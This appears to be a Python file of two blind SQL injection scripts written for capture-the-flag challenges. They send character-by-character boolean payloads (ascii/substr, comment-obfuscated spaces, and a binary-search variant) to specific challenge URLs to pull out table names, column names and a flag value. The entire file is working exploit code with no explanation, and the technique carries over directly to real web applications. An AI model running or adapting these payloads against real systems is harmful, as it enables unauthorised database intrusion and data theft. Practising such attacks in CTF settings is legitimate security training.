""" import requests
s=requests.session()
url='http://95e61223-48d2-47bd-a717-d8bd014d0d18.node4.buuoj.cn/check.php'
table=""

for i in range(1,45):
    print(i)
    for j in range(31,128):
        #爆表名  flag
        payload = "ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))
        #爆字段名 flag
        #payload = "ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#"%(str(i),str(j))
        #读取flag
        #payload = "ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#"%(str(i), str(j))

        ra = s.get(url=url + '?username1&password=0/**/or/**/' + payload).text

        if 'I asked nothing' in ra:
            table += chr(j)
            print(table)
            break """
import requests

url = 'http://1.14.71.254:28772/index.php'
result = ''

for x in range(1, 50):
    high = 127
    low = 32
    mid = (low + high) // 2
    while high > low:
        payload = "if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)" % (x, mid)
        data = {
            "id":payload
        }
        response = requests.post(url, data = data)
        if 'Hello' in response.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2

    result += chr(int(mid))
    print(result)

